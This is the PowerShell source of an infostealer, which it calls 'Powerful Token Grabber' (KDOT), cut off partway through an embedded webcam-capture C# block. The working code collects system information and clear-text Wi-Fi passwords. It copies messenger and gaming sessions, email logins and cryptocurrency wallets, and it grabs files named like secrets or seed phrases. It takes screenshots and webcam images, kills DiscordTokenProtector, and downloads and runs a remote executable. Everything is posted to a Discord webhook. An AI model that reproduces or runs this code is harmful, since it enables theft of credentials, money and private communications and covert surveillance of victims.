$ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
$ProgressPreference = 'SilentlyContinue' # Hide all Progresses

# Single Instance (no overloads)
function MUTEX-CHECK {
    $AppId = "16fcb8bb-e281-472d-a9f6-39f0f32f19f2" # This GUID string is changeable
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if( -not $CreatedNew ) {
        throw "An instance of this script is already running."
    } else {
        Invoke-ANTITOTAL
    }
    
}

function CHECK_IF_ADMIN {
    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
}

function EXFILTRATE-DATA {
    $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $ip = $ip.Content
    $ip > $env:LOCALAPPDATA\Temp\ip.txt
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = (get-date).toString("r")
    Get-ComputerInfo > $env:LOCALAPPDATA\Temp\system_info.txt
    $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
    $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
    $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
    $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
    $uuid > $env:LOCALAPPDATA\Temp\uuid.txt
    $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $cpu > $env:LOCALAPPDATA\Temp\cpu.txt
    $gpu = (Get-WmiObject Win32_VideoController).Name 
    $gpu > $env:LOCALAPPDATA\Temp\GPU.txt
    $format = " GB"
    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
    $raminfo = "$total" + "$format"  
    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    $mac > $env:LOCALAPPDATA\Temp\mac.txt
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
    $mfg = (gwmi win32_computersystem).Manufacturer 
    
    # System Uptime
    function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime
    
    # List of Installed AVs
    function get-installed-av {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
        $AntivirusProduct.displayName 
    }
    $avlist = get-installed-av -autosize | ft | out-string
    
    # Extracts all Wifi Passwords
    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
    $wifi = $wifipasslist | out-string 
    $wifi > $env:temp\WIFIPasswords.txt
    
    # Screen Resolution
    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0]
    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2]  
    $split = "x"
    $screen = "$width" + "$split" + "$height"  
    $screen
    
    # Startup Apps , Running Services, Processes, Installed Applications, and Network Adapters
    function misc {
        Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $env:temp\StartUpApps.txt
        Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
        Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
        Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
    }
    misc 
    
    # All Messaging Sessions
    New-Item -Path "$env:localappdata\Temp" -Name "Messaging Sessions" -ItemType Directory -force | out-null
    $messaging_sessions = "$env:localappdata\Temp\Messaging Sessions"

    # Telegram Session Stealer
    function telegramstealer {
        $processname = "telegram"
        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
        $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
        $destination = "$messaging_sessions\Telegram.zip"
        $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
        $files = Get-ChildItem -Path $path -Exclude $exclude
        Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
    }
    telegramstealer 
    
    # Element Session Stealer
    function elementstealer {
        $processname = "element"
        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
        $element_session = "$messaging_sessions\Element"
        New-Item -ItemType Directory -Force -Path $element_session
        $elementfolder = "$env:userprofile\AppData\Roaming\Element"
        Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
    }
    elementstealer 
    
    # Signal Session Stealer
    function signalstealer {
        $processname = "signal"
        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
        $signal_session = "$messaging_sessions\Signal"
        New-Item -ItemType Directory -Force -Path $signal_session
        $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
        Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
    }
    signalstealer 

    # All Gaming Sessions
    New-Item -Path "$env:localappdata\Temp" -Name "Gaming Sessions" -ItemType Directory -force | out-null
    $gaming_sessions = "$env:localappdata\Temp\Gaming Sessions"

    # Steam Session Stealer
    function steamstealer {
        $processname = "steam"
        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
        $steam_session = "$gaming_sessions\Steam"
        New-Item -ItemType Directory -Force -Path $steam_session
        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
        $ssfnfiles = @("ssfn$1")
        foreach($file in $ssfnfiles) {
            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
        }
    }
    steamstealer 
    
    # Minecraft Session Stealer
    function minecraftstealer {
        $minecraft_session = "$gaming_sessions\Minecraft"
        New-Item -ItemType Directory -Force -Path $minecraft_session
        $minecraftfolder1 = $env:appdata + "\.minecraft"
        $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
        Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
        Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
    }
    minecraftstealer 
    
    # Epicgames Session Stealer
    function epicgames_stealer {
            $processname = "epicgameslauncher"
            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
            $epicgames_session = "$gaming_sessions\EpicGames"
            New-Item -ItemType Directory -Force -Path $epicgames_session
            $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
            Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
            Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
            Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
    }
    epicgames_stealer 
    
    # Ubisoft Session Stealer
    function ubisoftstealer {
            $processname = "upc"
            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
            $ubisoft_session = "$gaming_sessions\Ubisoft"
            New-Item -ItemType Directory -Force -Path $ubisoft_session
            $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
            Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
    }
    ubisoftstealer 
    
    # EA Session Stealer
    function electronic_arts {
            $processname = "eadesktop"
            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
            $ea_session = "$gaming_sessions\Electronic Arts"
            New-Item -ItemType Directory -Force -Path $ea_session
            $eafolder = "$env:localappdata\Electronic Arts"
            Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
    }
    electronic_arts    
    
    # Desktop screenshot
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $screens = [Windows.Forms.Screen]::AllScreens
    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save("$env:localappdata\temp\desktop-screenshot.png")
    $graphics.Dispose()
    $bmp.Dispose()
    
    # Disk Information
    function diskdata {
        $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
        $results = foreach ($disk in $disks) {
            if ($disk.Size -gt 0) {
                $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
                $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
                $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
                [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
                [int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
                [PSCustomObject]@{
                    Drive = $disk.Name
                    Name = $disk.VolumeName
                    "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                    "Free Disk Size" = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, ($FreePercent)
                    "Used Space" = "{0:N0} GB ({1:N0} %)" -f $usedspace, ($usedpercent)
                }
            }
        }
        $results | out-string 
    }
    $alldiskinfo = diskdata
    $alldiskinfo > $env:temp\DiskInfo.txt
    
    #Extracts Product Key
    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        } catch {
            return "No product key found"
        }
    }
    
    Get-ProductKey > $env:localappdata\temp\ProductKey.txt    
    
    # Create temporary directory to store wallet data for exfiltration
    New-Item -Path "$env:localappdata\Temp" -Name "Crypto Wallets" -ItemType Directory -force | out-null
    $crypto = "$env:localappdata\Temp\Crypto Wallets"
    
    
    New-Item -Path "$env:localappdata\Temp" -Name "Email Clients" -ItemType Directory -force | out-null
    $emailclientsfolder = "$env:localappdata\Temp\Email Clients"
    
    # Thunderbird Exfil
    $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
    If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
    New-Item -Path "$emailclientsfolder\Thunderbird" -ItemType Directory | Out-Null
    Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$emailclientsfolder\Thunderbird" -Recurse -Force
    }
    
    # Crypto Wallets
    
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
    New-Item -Path "$crypto\Armory" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$crypto\Armory" -Recurse -Force
    }
    
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
    New-Item -Path "$crypto\Atomic" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$crypto\Atomic" -Recurse -Force
    }
    
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
    New-Item -Path "$crypto\BitcoinCore" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\BitcoinCore" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
    New-Item -Path "$crypto\bytecoin" -ItemType Directory | Out-Null
    Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$crypto\bytecoin" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
    New-Item -Path "$crypto\Coinomi" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$crypto\Coinomi" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
    New-Item -Path "$crypto\DashCore" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\DashCore" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
    New-Item -Path "$crypto\Electrum" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$crypto\Electrum" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
    New-Item -Path "$crypto\Ethereum" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$crypto\Ethereum" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
    New-Item -Path "$crypto\exodus.wallet" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$crypto\exodus.wallet" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
    New-Item -Path "$crypto\Guarda" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\IndexedDB" -Recurse | Copy-Item -Destination "$crypto\Guarda" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
    New-Item -Path "$crypto\liberty.jaxx" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$crypto\liberty.jaxx" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
    New-Item -Path "$crypto\Litecoin" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\Litecoin" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
    New-Item -Path "$crypto\Monero" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$crypto\Monero" -Recurse  -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
    New-Item -Path "$crypto\Zcash" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$crypto\Zcash" -Recurse -Force
    }

    #Files Grabber 
    New-Item -Path "$env:localappdata\Temp" -Name "Files Grabber" -ItemType Directory -force | out-null
    $filegrabber = "$env:localappdata\Temp\Files Grabber"
    Function GrabFiles {
        $grabber = @(
            "account",
            "login",
            "metamask",
            "crypto",
            "code",
            "coinbase",
            "exodus",
            "backupcode",
            "token",
            "seedphrase",
            "private",
            "pw",
            "lastpass",
            "keepassx",
            "keepass",
            "keepassxc",
            "nordpass",
            "syncthing",
            "dashlane",
            "bitwarden",
            "memo",
            "keys",
            "secret",
            "recovery",
            "2fa",
            "pass",
            "login",
            "backup",
            "discord",
            "paypal",
            "wallet"
        )
        $dest = "$env:localappdata\Temp\Files Grabber"
        $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
        [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) -join "|") + ")"
        (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
    }
    GrabFiles
    
    $embed_and_body = @{
        "username" = "KDOT"
        "content" = "@everyone"
        "title" = "KDOT"
        "description" = "Powerful Token Grabber"
        "color" = "16711680"
        "avatar_url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
        "url" = "https://discord.gg/vk3rBhcj2y"
        "embeds" = @(
            @{
                "title" = "POWERSHELL GRABBER"
                "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main"
                "description" = "New victim info collected !"
                "color" = "16711680"
                "footer" = @{
                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
                }
                "thumbnail" = @{
                    "url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
                }
                "fields" = @(
                    @{
                        "name" = ":satellite: IP"
                        "value" = "``````$ip``````"
                    },
                    @{
                        "name" = ":bust_in_silhouette: User Information"
                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                    },
                    @{
                        "name" = ":shield: Antivirus"
                        "value" = "``````$avlist``````"
                    },
                    @{
                        "name" = ":computer: Hardware"
                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                    },
                    @{
                        "name" = ":floppy_disk: Disk"
                        "value" = "``````$alldiskinfo``````"
                    }
                    @{
                        "name" = ":signal_strength: WiFi"
                        "value" = "``````$wifi``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null

    Get-WebCamImage

    curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook | out-null

    $items = Get-ChildItem -Path $env:localappdata\temp\ -Filter out*.jpg
    foreach ($item in $items) {
        $name = $item.Name
        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:localappdata\temp\$name\`"" $webhook | out-null
        Remove-Item $item.Name -Force
    }

    Set-Location $env:LOCALAPPDATA\Temp

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Stop-Process -Name DiscordTokenProtector -Force
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }

    $TEMP_KDOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT"
    if ($TEMP_KDOT -eq $false) {
        New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
    }

    #Disable system start discord on startup (The Program Automatically Restarts It)
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Discord Inc\Discord.lnk" -Force
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force
    
    #Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.2/main.exe" -OutFile "main.exe" -UseBasicParsing
    (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")

    #This is needed for the injection to work
    Stop-Process -Name discord -Force
    Stop-Process -Name discordcanary -Force
    Stop-Process -Name discordptb -Force

    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
    $proc.WaitForExit()

    $extracted = "$env:LOCALAPPDATA\Temp"
    Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" 
    Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" 
    Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" 
    Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" 
    Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" 
    New-Item -Path "$env:localappdata\Temp\KDOT" -Name "Browser Data" -ItemType Directory -force | out-null
    Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\Browser Data" 
    Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\Browser Data" 
    Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\Browser Data" 
    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" 
    Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" 
    Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" 
    Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" 
    Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" 
    Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" 
    Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" 
    Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" 
    Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" 
    Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" 
    Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" 
    Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" 
    Move-Item -Path "$messaging_sessions" -Destination "$extracted\KDOT" 
    Move-Item -Path "$gaming_sessions" -Destination "$extracted\KDOT"
    Move-Item -Path "$filegrabber" -Destination "$extracted\KDOT" 
    Move-Item -Path "$crypto" -Destination "$extracted\KDOT" 
    Move-Item -Path "$emailclientsfolder" -Destination "$extracted\KDOT" 
    
    # Don't send null data
    
    Get-ChildItem -Path "$extracted\KDOT" -File | ForEach-Object {
        $_.Attributes = $_.Attributes -band (-bnot [System.IO.FileAttributes]::ReadOnly)
    }
    
    # Remove empty files
    Get-ChildItem -Path "$extracted\KDOT" -File | Where-Object {
        $_.Length -eq 0
    } | Remove-Item -Force
    
    # Remove empty folders
    $Empty = Get-ChildItem "$extracted\KDOT" -Directory -Recurse |
    Where-Object {(Get-ChildItem $_.FullName -File -Recurse -Force).Count -eq 0}
    Foreach ($Dir in $Empty)
    {
        if (test-path $Dir.FullName)
        {Remove-Item -LiteralPath $Dir.FullName -recurse -force}
    }
    
    Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
    Remove-Item "$extracted\KDOT.zip" -Force
    Remove-Item "$extracted\KDOT" -Recurse -Force
    Remove-Item "$filegrabber" -recurse -force
    Remove-Item "$crypto" -recurse -force
    Remove-Item "$messaging_sessions" -recurse -force
    Remove-Item "$gaming_sessions" -recurse -force
    Remove-Item "$emailclientsfolder" -recurse -force
    Remove-Item "$extracted\main.exe" -Force
}

function Get-WebCamImage {
    # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
    # he did 99% of the work
    # other 1% modified by KDot227
    # had to half learn c# to figure anything out (I still don't understand it)
    $source=@" 
    using System; 
    using System.Collections.Generic; 
    using System.Text; 
    using System.Collections; 
    using System.Runtime.InteropServices; 
    using System.ComponentModel; 
    using System.Data; 
    using System.Drawing; 
    using System.Windows.Forms; 
    
    namespace WebCamLib 
    { 
        public class Device 
        { 
            private const short WM_CAP = 0x400; 
            private const int WM_CAP_DRIVER_CONNECT = 0x40a; 
            private const int WM_CAP_DRIVER_DISCONNECT = 0x40b; 
            private const int WM_CAP_EDIT_COPY = 0x41e; 
            private const int WM_CAP_SET_PREVIEW = 0x432; 
            private const int WM_CAP_SET_OVERLAY = 0x433; 
            private const int WM_CAP_SET_PREVIEWRATE = 0x434; 
            private const int WM_CAP_SET_SCALE = 0x435; 
            private const int WS_CHILD = 0x40000000; 
            private const int WS_VISIBLE = 0x10000000; 
    
            [DllImport("avicap32.dll")] 
            protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, 
                int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID); 
    
            [DllImport("user32", EntryPoint = "SendMessageA")] 
            protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam); 
    
            [DllImport("user32")] 
            protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags); 
    
            [DllImport("user32")] 
            protected static extern bool DestroyWindow(int hwnd); 
                    
            int index; 
            int deviceHandle; 
    
            public Device(int index) 
            { 
                this.index = index; 
            } 
    
            private string _name; 
    
            public string Name 
            { 
                get { return _name; } 
                set { _name = value; } 
            } 
    
            private string _version; 
    
            public string Version 
            { 
                get { return _version; } 
                set { _version = value; } 
            } 
    
            public override string ToString() 
            { 
                return this.Name; 
            } 
    
            public void Init(int windowHeight, int windowWidth, int handle) 
            { 
                string deviceIndex = Convert.ToString(this.index); 
                deviceHandle = capCreateCaptureWindowA(ref deviceIndex, WS_VISIBLE | WS_CHILD, 0, 0, windowWidth, windowHeight, handle, 0); 
    
                if (SendMessage(deviceHandle, WM_CAP_DRIVER_CONNECT, this.index, 0) > 0) 
                { 
                    SendMessage(deviceHandle, WM_CAP_SET_SCALE, -1, 0); 
                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEWRATE, 0x42, 0); 
                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEW, -1, 0); 
                    SetWindowPos(deviceHandle, 1, 0, 0, windowWidth, windowHeight, 6); 
                } 
            } 
    
            public void ShowWindow(global::System.Windows.Forms.Control windowsControl) 
            { 
                Init(windowsControl.Height, windowsControl.Width, windowsControl.Handle.ToInt32());                         
            } 
            
            public void CopyC() 
            { 
                SendMessage(this.deviceHandle, WM_CAP_EDIT_COPY, 0, 0);          
            } 
    
            public void Stop() 
            { 
                SendMessage(deviceHandle, WM_CAP_DRIVER_DISCONNECT, this.index, 0); 
                DestroyWindow(deviceHandle); 
            } 
        } 
        
        public class DeviceManager 
        { 
            [DllImport("avicap32.dll")] 
            protected static extern bool capGetDriverDescriptionA(short wDriverIndex, 
                [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName, 
            int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer); 
    
            static ArrayList devices = new ArrayList(); 
    
            public static Device[] GetAllDevices() 
            { 
                String dName = "".PadRight(100); 
                String dVersion = "".PadRight(100); 
    
